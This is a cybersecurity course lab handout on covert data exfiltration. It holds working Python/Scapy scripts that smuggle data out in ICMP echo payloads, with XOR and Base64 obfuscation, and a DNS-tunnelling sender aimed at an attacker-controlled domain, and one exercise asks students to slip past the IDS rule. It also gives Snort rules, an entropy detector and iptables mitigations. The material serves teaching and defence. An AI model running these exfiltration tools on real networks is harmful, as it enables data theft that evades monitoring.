# Lab Session: Data Exfiltration via Covert Channels
### Introduction to Cybersecurity — Hands-On Lab

---

## Overview

In this lab, students will implement and analyse a **covert data exfiltration channel** using the ICMP protocol. By the end of the session, students will understand how attackers abuse legitimate network protocols to smuggle data out of a network undetected, and how defenders can identify and block such techniques.

> **Ethics Notice:** All activities in this lab must be performed **exclusively within the provided isolated virtual lab environment**. Using these techniques on any production network or unauthorised system is illegal and unethical.

---

## Learning Objectives

By completing this lab, students will be able to:

1. Explain what a covert channel is and how it differs from an overt data transfer.
2. Implement a basic ICMP-based exfiltration tool using Python and Scapy.
3. Extend the basic tool with chunked payloads and simple obfuscation.
4. Capture and analyse covert ICMP traffic using Wireshark / tcpdump.
5. Describe two additional protocol-based exfiltration techniques (DNS, HTTP).
6. Configure a host-based detection rule using Snort/Suricata.

---

## Background

### What Is Data Exfiltration?

Data exfiltration is the unauthorised transfer of data from a system to an external location. It is a key stage in many real-world attacks (e.g., APT campaigns, ransomware pre-encryption phases). Attackers must move data **out** of the target environment while evading firewalls, DLP systems, and IDS/IPS tools.

### Covert Channels

A **covert channel** exploits a communication path that was not intended for data transmission — such as the payload or header fields of a protocol that is routinely allowed through firewalls (ICMP, DNS, HTTP).

```
Normal channel:   [Application Data] → TCP/HTTP → Internet
Covert channel:   [Stolen Data encoded in ICMP payload] → ICMP → Internet
```

### Why ICMP?

ICMP (Internet Control Message Protocol, RFC 792) is used for network diagnostics (`ping`, `traceroute`). Key properties that make it attractive for covert channels:

| Property | Attacker Advantage |
|---|---|
| Usually allowed by firewalls | Data can leave the perimeter |
| No TCP handshake / session state | Harder to correlate with an "open connection" |
| Payload field is flexible | Arbitrary data can be placed there |
| Replies are expected | Bidirectional tunnel is possible |

An ICMP Echo Request (type 8) contains:
- **Type** (1 byte): 8 = Echo Request
- **Code** (1 byte): 0
- **Checksum** (2 bytes)
- **Identifier** (2 bytes): can be abused as a channel tag
- **Sequence Number** (2 bytes): can encode ordering
- **Payload** (variable): normally ignored — this is where we hide data

---

## Lab Environment Setup

### Requirements

- **Two virtual machines** on an isolated host-only network:
  - **VM-A (Sender/Victim):** IP `192.168.56.10`
  - **VM-B (Receiver/Attacker):** IP `192.168.56.20`
- Python 3.8+ on both VMs
- Scapy library: `pip install scapy`
- Wireshark or tcpdump installed on VM-B
- Root / sudo privileges (required for raw socket access)

### Verify Connectivity

```bash
# On VM-A
ping -c 3 192.168.56.20
```

---

## Part 1 — Basic ICMP Exfiltration (One Character per Packet)

In this first implementation, each ICMP packet carries **one character** of the secret message inside its payload.

### `sender_basic.py` — Run on VM-A

```python
#!/usr/bin/env python3
"""
ICMP Covert Channel - Basic Sender
Encodes one character per ICMP Echo Request payload.

Usage: sudo python3 sender_basic.py <target_ip> "<secret_message>"
"""

import sys
import time
from scapy.all import IP, ICMP, send

# Magic identifier that tags our covert packets (distinguishes them from legit pings)
COVERT_ID = 0x4C41   # "LA" in ASCII — change this to your student ID

def exfiltrate(target_ip: str, message: str, delay: float = 0.2) -> None:
    print(f"[*] Target     : {target_ip}")
    print(f"[*] Message    : '{message}' ({len(message)} chars)")
    print(f"[*] Channel ID : 0x{COVERT_ID:04X}")
    print()

    for seq, char in enumerate(message):
        pkt = (
            IP(dst=target_ip) /
            ICMP(type=8, code=0, id=COVERT_ID, seq=seq) /
            char.encode("utf-8")
        )
        send(pkt, verbose=False)
        print(f"  [+] seq={seq:04d}  char='{char}'  ASCII={ord(char)}")
        time.sleep(delay)

    # Termination sentinel: seq=0xFFFF, payload="END"
    end_pkt = (
        IP(dst=target_ip) /
        ICMP(type=8, code=0, id=COVERT_ID, seq=0xFFFF) /
        b"END"
    )
    send(end_pkt, verbose=False)
    print("\n[*] Termination packet sent. Done.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <target_ip> <message>")
        sys.exit(1)
    exfiltrate(sys.argv[1], sys.argv[2])
```

### `receiver_basic.py` — Run on VM-B

```python
#!/usr/bin/env python3
"""
ICMP Covert Channel - Basic Receiver
Reassembles a message from ICMP Echo Request payloads.

Usage: sudo python3 receiver_basic.py [interface]
"""

import sys
from scapy.all import sniff, IP, ICMP

COVERT_ID = 0x4C41   # Must match sender

received: dict[int, str] = {}
done = False

def handle_packet(pkt) -> None:
    global done

    # Only process ICMP Echo Requests (type=8) with our magic ID
    if not (pkt.haslayer(ICMP) and pkt[ICMP].type == 8):
        return
    if pkt[ICMP].id != COVERT_ID:
        return

    seq = pkt[ICMP].seq
    raw_payload = bytes(pkt[ICMP].payload)

    # Termination sentinel
    if seq == 0xFFFF:
        print("\n[*] Termination received — reassembling message...")
        message = "".join(received[k] for k in sorted(received))
        print(f"\n[+] Exfiltrated message: '{message}'\n")
        done = True
        return

    char = raw_payload.decode("utf-8", errors="replace").rstrip("\x00")
    src = pkt[IP].src
    received[seq] = char
    print(f"  [<] seq={seq:04d}  from={src}  char='{char}'")

def stop_condition(pkt) -> bool:
    return done

if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] Listening on {iface} for covert ICMP (ID=0x{COVERT_ID:04X}) ...")
    sniff(
        iface=iface,
        filter="icmp and icmp[0] == 8",   # BPF: Echo Requests only
        prn=handle_packet,
        stop_filter=stop_condition
    )
```

### Running Part 1

```bash
# Terminal 1 — VM-B (start receiver first)
sudo python3 receiver_basic.py eth0

# Terminal 2 — VM-A (send the message)
sudo python3 sender_basic.py 192.168.56.20 "Hello World"
```

**Expected output on VM-B:**
```
[*] Listening on eth0 for covert ICMP (ID=0x4C41) ...
  [<] seq=0000  from=192.168.56.10  char='H'
  [<] seq=0001  from=192.168.56.10  char='e'
  ...
[*] Termination received — reassembling message...
[+] Exfiltrated message: 'Hello World'
```

---

## Part 2 — Chunked Payload with XOR Obfuscation

Real attackers rarely send one byte per packet (too noisy). This version packs **multiple bytes** per payload and applies a simple **XOR cipher** to obscure the content from shallow packet inspection.

### `sender_advanced.py` — Run on VM-A

```python
#!/usr/bin/env python3
"""
ICMP Covert Channel - Advanced Sender
Features:
  - Configurable chunk size (multiple chars per packet)
  - XOR obfuscation with a shared key
  - Base64 encoding so payload is always printable bytes

Usage: sudo python3 sender_advanced.py <target_ip> "<message>" [chunk_size] [xor_key]
"""

import sys
import time
import base64
from scapy.all import IP, ICMP, send

COVERT_ID   = 0x4C42          # Different ID from Part 1 — avoids confusion
CHUNK_SIZE  = 8               # Characters per packet
XOR_KEY     = 0x5A            # Single-byte XOR key (0x00 = disabled)

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def exfiltrate(target_ip: str, message: str, chunk: int = CHUNK_SIZE, key: int = XOR_KEY) -> None:
    encoded  = message.encode("utf-8")
    obfuscated = xor_bytes(encoded, key)
    b64_data = base64.b64encode(obfuscated)     # Now safe to embed as payload

    chunks = [b64_data[i:i+chunk] for i in range(0, len(b64_data), chunk)]
    total  = len(chunks)

    print(f"[*] Target     : {target_ip}")
    print(f"[*] Plaintext  : '{message}'")
    print(f"[*] XOR key    : 0x{key:02X}")
    print(f"[*] B64 payload: {b64_data.decode()}")
    print(f"[*] Chunks     : {total} packets of up to {chunk} bytes")
    print()

    for seq, chunk_data in enumerate(chunks):
        pkt = (
            IP(dst=target_ip) /
            ICMP(type=8, code=0, id=COVERT_ID, seq=seq) /
            chunk_data
        )
        send(pkt, verbose=False)
        print(f"  [+] seq={seq:04d}  payload={chunk_data}")
        time.sleep(0.1)

    # Termination: encode total packet count in payload for integrity check
    end_pkt = (
        IP(dst=target_ip) /
        ICMP(type=8, code=0, id=COVERT_ID, seq=0xFFFF) /
        str(total).encode()
    )
    send(end_pkt, verbose=False)
    print(f"\n[*] Done. Sent {total} data packets.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <target_ip> <message> [chunk_size] [xor_key]")
        sys.exit(1)
    t_ip  = sys.argv[1]
    msg   = sys.argv[2]
    csz   = int(sys.argv[3]) if len(sys.argv) > 3 else CHUNK_SIZE
    xkey  = int(sys.argv[4], 16) if len(sys.argv) > 4 else XOR_KEY
    exfiltrate(t_ip, msg, csz, xkey)
```

### `receiver_advanced.py` — Run on VM-B

```python
#!/usr/bin/env python3
"""
ICMP Covert Channel - Advanced Receiver
Reassembles chunked, XOR-obfuscated, Base64-encoded payloads.

Usage: sudo python3 receiver_advanced.py [interface]
"""

import sys
import base64
from scapy.all import sniff, IP, ICMP

COVERT_ID = 0x4C42
XOR_KEY   = 0x5A

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

received: dict[int, bytes] = {}
done = False

def handle_packet(pkt) -> None:
    global done
    if not (pkt.haslayer(ICMP) and pkt[ICMP].type == 8):
        return
    if pkt[ICMP].id != COVERT_ID:
        return

    seq         = pkt[ICMP].seq
    raw_payload = bytes(pkt[ICMP].payload)

    if seq == 0xFFFF:
        expected_chunks = int(raw_payload.decode())
        print(f"\n[*] Termination received (expected {expected_chunks} chunks, got {len(received)})")

        # Reassemble ordered chunks
        b64_combined = b"".join(received[k] for k in sorted(received))
        try:
            obfuscated = base64.b64decode(b64_combined)
            plaintext  = xor_bytes(obfuscated, XOR_KEY).decode("utf-8")
            print(f"[+] Exfiltrated message: '{plaintext}'\n")
        except Exception as e:
            print(f"[-] Decode error: {e}")
        done = True
        return

    received[seq] = raw_payload
    print(f"  [<] seq={seq:04d}  payload={raw_payload}")

def stop_condition(pkt) -> bool:
    return done

if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] Listening on {iface} (ID=0x{COVERT_ID:04X}, XOR=0x{XOR_KEY:02X}) ...")
    sniff(
        iface=iface,
        filter="icmp and icmp[0] == 8",
        prn=handle_packet,
        stop_filter=stop_condition
    )
```

---

## Part 3 — Traffic Analysis with Wireshark

### Capture the Traffic

On **VM-B**, start a capture before running the sender:

```bash
# Command-line capture
sudo tcpdump -i eth0 -w /tmp/icmp_lab.pcap icmp

# Or open Wireshark → select eth0 → start capture
```

### Wireshark Analysis Questions

After running both Part 1 and Part 2:

1. **Apply the filter** `icmp.type == 8` — how many Echo Requests do you see compared to a normal `ping`?
2. Navigate to **Packet Details → ICMP → Data** for a Part 1 packet. What do you see in the raw bytes?
3. Compare the **payload lengths** between Part 1 and Part 2 packets.
4. For Part 2, the payload looks like Base64. Can you manually decode a captured chunk in the terminal?
   ```bash
   echo "SGVsbG8=" | base64 -d | python3 -c "import sys; print(bytes(b^0x5A for b in sys.stdin.buffer.read()))"
   ```
5. How does the Part 2 traffic **differ visually** from a standard OS `ping`?

---

## Part 4 — Alternative Protocol: DNS Tunneling (Conceptual + Demo)

DNS is another popular covert channel because DNS queries are almost universally allowed through firewalls. Data is encoded in the **subdomain label** of a DNS query.

```
Normal DNS:    query → example.com
Covert DNS:    query → SGVsbG8K.attacker-controlled-domain.com
                         ^^^^^^^^ Base64-encoded stolen data
```

### `dns_sender_demo.py` — Conceptual Demo

```python
#!/usr/bin/env python3
"""
DNS Covert Channel - Demonstration
Encodes data in DNS subdomain labels (max 63 chars per label).
Requires: a domain you control with a custom NS record pointing to receiver_dns.py

NOTE: This demo uses Scapy to craft raw DNS queries. In a real lab
you may point queries at your own VM-B running a mock DNS server.

Usage: sudo python3 dns_sender_demo.py <dns_server_ip> "<message>" <domain>
"""

import sys
import base64
import time
from scapy.all import IP, UDP, DNS, DNSQR, send

CHUNK = 30      # bytes per label (safe under the 63-char DNS label limit after Base64 encoding)

def exfiltrate_dns(dns_server: str, message: str, domain: str) -> None:
    data   = base64.b64encode(message.encode()).decode()
    chunks = [data[i:i+CHUNK] for i in range(0, len(data), CHUNK)]

    print(f"[*] Sending {len(chunks)} DNS queries to {dns_server} via domain {domain}")
    for seq, chunk in enumerate(chunks):
        # Encode sequence number in the leftmost label
        fqdn = f"{seq:04d}.{chunk}.{domain}."
        pkt  = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=fqdn))
        send(pkt, verbose=False)
        print(f"  [+] Query: {fqdn}")
        time.sleep(0.05)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: sudo python3 {sys.argv[0]} <dns_ip> <message> <domain>")
        sys.exit(1)
    exfiltrate_dns(sys.argv[1], sys.argv[2], sys.argv[3])
```

### Wireshark Filter for DNS Tunneling

```
dns.qry.name contains "."
```
Look for unusually **long subdomain labels** or domains with high **Shannon entropy** — hallmarks of encoded data.

---

## Part 5 — Detection and Defense

Understanding the attack lets you build defences. Complete the following tasks.

### 5.1 — Write a Snort/Suricata Rule

```
# Detect ICMP Echo Requests with payloads larger than standard OS pings (Windows=32B, Linux=56B)
alert icmp any any -> $HOME_NET any (
    msg:"Possible ICMP covert channel - oversized payload";
    itype:8;
    dsize:>64;
    sid:9000001;
    rev:1;
)

# Detect high-frequency ICMP from a single source (threshold: >20 pings/second)
alert icmp any any -> $HOME_NET any (
    msg:"ICMP flood / possible exfiltration";
    itype:8;
    threshold: type both, track by_src, count 20, seconds 1;
    sid:9000002;
    rev:1;
)
```

### 5.2 — Python-Based Anomaly Detector

```python
#!/usr/bin/env python3
"""
ICMP Anomaly Detector
Flags ICMP Echo Requests that look suspicious:
  - Payload size outside the OS-normal range
  - High packet rate from a single source
  - Non-printable or high-entropy payloads

Usage: sudo python3 detector.py [interface]
"""

import sys
import math
import time
from collections import defaultdict
from scapy.all import sniff, IP, ICMP

# Thresholds
NORMAL_PAYLOAD_MAX = 64          # bytes — standard OS pings are ≤56 bytes data
RATE_WINDOW        = 5.0         # seconds
RATE_THRESHOLD     = 15          # packets per window per source IP
ENTROPY_THRESHOLD  = 4.5         # bits — high entropy suggests encoded data

packet_times: dict = defaultdict(list)

def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = defaultdict(int)
    for byte in data:
        freq[byte] += 1
    n = len(data)
    return -sum((c/n) * math.log2(c/n) for c in freq.values())

def check_packet(pkt) -> None:
    if not (pkt.haslayer(ICMP) and pkt[ICMP].type == 8):
        return

    src     = pkt[IP].src
    payload = bytes(pkt[ICMP].payload)
    now     = time.time()
    alerts  = []

    # 1. Payload size check
    if len(payload) > NORMAL_PAYLOAD_MAX:
        alerts.append(f"large payload ({len(payload)} bytes)")

    # 2. Entropy check
    entropy = shannon_entropy(payload)
    if entropy > ENTROPY_THRESHOLD:
        alerts.append(f"high entropy ({entropy:.2f} bits)")

    # 3. Rate check
    packet_times[src] = [t for t in packet_times[src] if now - t < RATE_WINDOW]
    packet_times[src].append(now)
    if len(packet_times[src]) > RATE_THRESHOLD:
        alerts.append(f"high rate ({len(packet_times[src])} pkts/{RATE_WINDOW:.0f}s)")

    if alerts:
        print(f"[!] ALERT — src={src}  seq={pkt[ICMP].seq}  "
              f"payload={payload[:20]}...  reasons: {', '.join(alerts)}")

if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] ICMP anomaly detector running on {iface} ...")
    sniff(iface=iface, filter="icmp", prn=check_packet)
```

### 5.3 — Firewall Mitigation

On a Linux host, you can block ICMP packets with oversized payloads using `iptables`:

```bash
# Allow standard-sized ICMP echo requests (up to 64 bytes payload)
sudo iptables -A INPUT  -p icmp --icmp-type echo-request -m length --length 0:92  -j ACCEPT
sudo iptables -A OUTPUT -p icmp --icmp-type echo-request -m length --length 0:92  -j ACCEPT

# Block all other ICMP echo requests (likely carrying covert data)
sudo iptables -A INPUT  -p icmp --icmp-type echo-request -j DROP
sudo iptables -A OUTPUT -p icmp --icmp-type echo-request -j DROP
```

> **Discussion:** What are the drawbacks of this firewall rule? Can an attacker evade it?

---

## Exercises

| # | Task | Deliverable |
|---|------|-------------|
| **E1** | Run Part 1 and capture the traffic. Identify the covert packets in Wireshark and extract the message manually from the hex dump. | Screenshot + short write-up |
| **E2** | Modify `sender_advanced.py` to use a **multi-byte XOR key** (e.g., the key rotates through `[0x1A, 0x2B, 0x3C]`). Update the receiver accordingly. | Modified source files |
| **E3** | Run the anomaly detector while exfiltrating. Does it catch Part 1? Part 2? Tune the thresholds until both are detected. | Modified `detector.py` + explanation |
| **E4** | Implement a **bidirectional channel**: VM-B sends an ACK back to VM-A for each received packet using ICMP Echo Reply (type 0). | `sender_ack.py` + `receiver_ack.py` |
| **E5** (Advanced) | Implement the DNS sender so that it **stays under a standard payload size** to evade the size-based IDS rule from §5.1. | Modified DNS sender + explanation |

---

## Discussion Questions

1. Why is ICMP often **not filtered** at corporate firewalls? What legitimate operational reason justifies this?
2. How does the **identifier field** (0x4C41) in our covert channel serve a similar purpose to a TCP port number?
3. Compare the **detectability** of Part 1 (one char per packet) vs Part 2 (chunked + XOR). What operational trade-off does each represent?
4. What is **Shannon entropy** and why is it a useful signal for detecting encoded covert channel traffic?
5. An attacker limits the ICMP rate to **one packet every 60 seconds**. Estimate how long it would take to exfiltrate a 1 MB file. Is this a realistic attack? When might low-and-slow exfiltration be preferred?
6. Name **two other protocols** (besides ICMP and DNS) that could be used for covert channels and explain why they are attractive to attackers.

---

## Further Reading

- RFC 792 — Internet Control Message Protocol
- Loki project (1996) — original ICMP tunnelling PoC by Phrack Magazine
- Kaminsky, D. — DNS as a covert channel (DEF CON 2004)
- MITRE ATT&CK — T1048: Exfiltration Over Alternative Protocol

---

*Lab prepared for Introduction to Cybersecurity. For use in isolated lab environments only.*